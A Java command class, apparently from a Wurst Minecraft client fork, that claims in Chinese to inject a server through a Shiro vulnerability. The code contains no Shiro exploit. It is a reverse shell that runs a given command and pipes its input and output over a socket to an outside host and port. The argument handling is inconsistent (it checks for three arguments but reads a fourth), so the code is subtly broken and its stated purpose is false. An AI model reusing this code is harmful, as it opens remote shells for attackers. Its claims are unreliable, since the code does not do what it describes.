/*
 * Copyright (C) 2017 - 2019 | Wurst-Imperium | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.forge.commands;

import net.wurstclient.forge.Command;
import net.wurstclient.forge.utils.ChatUtils;

public final class ShiroCmd extends Command {
    public ShiroCmd() {
        super("shiro", "试图使用Shiro漏洞注入服务器.", "语法: .shiro <靶机IP> <端口> <命令>");
    }

    @Override
    public void call(String[] args) throws CmdException {
        if (args.length != 3)
            throw new CmdSyntaxError();
        else if (Integer.parseInt(args[2]) > 65536 || Integer.parseInt(args[2]) < 1) {
            throw new CmdSyntaxError("端口号必须>1且<65536.");
        } else {
            try {
                String host = args[1];
                int port = 80;
                String cmd = args[3];
                try {
                    port = Integer.parseInt(args[2]);
                } catch (NumberFormatException e) {
                    throw new CmdSyntaxError("端口必须为一个>1且<65536的数字.");
                }

                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                java.net.Socket s = new java.net.Socket(host, port);
                java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {
                    while (pi.available() > 0) {
                        so.write(pi.read());
                    }
                    while (pe.available() > 0) {
                        so.write(pe.read());
                    }
                    while (si.available() > 0) {
                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception err) {
                    }
                }
                p.destroy();
                s.close();
            } catch (Exception var1) {
                ChatUtils.warning("Shiro注入失败.");
                var1.printStackTrace();
            }
        }
    }
}